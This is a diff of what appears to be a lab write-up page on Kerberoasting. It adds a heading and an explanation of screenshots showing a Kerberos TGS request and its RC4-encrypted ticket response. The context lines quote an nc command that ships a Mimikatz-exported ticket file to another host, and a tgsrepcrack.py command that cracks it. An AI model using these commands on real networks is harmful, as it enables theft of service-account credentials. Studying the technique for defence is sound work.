@@ -75,6 +75,8 @@ nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.of
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+### Cracking the Ticket
+
 Attacker brute forces the password of the service ticket:
 
 {% code-tabs %}
@@ -87,9 +89,15 @@ python2 tgsrepcrack.py pwd kerberoast.bin
 
 ![](../.gitbook/assets/kerberoast-cracked.png)
 
-
-
 ## Observations
+
+Below is the screenshot showing a request being sent to the `Ticket Granting Service` \(TGS\) for the service with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :
+
+![](../.gitbook/assets/kerberoast-tgs-req.png)
+
+Below is the response from the TGS for the user `spotless` \(we initiated this attack from offense\spotless\) which contains the encrypted kerberos ticket to access the `HTTP/dc-mantvydas.offense.local` service, which is encrypted with RC4 and it's the one that was cracked with [tgsrepcrack.py](t1208-kerberoasting.md#cracking-the-ticket):
+
+![](../.gitbook/assets/kerberoast-tgs-res.png)
 
 {% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1208\",\"type\":\"link\",\"title\":\"Kerberoasting - ATT&CK for Enterprise\"}" %}
 
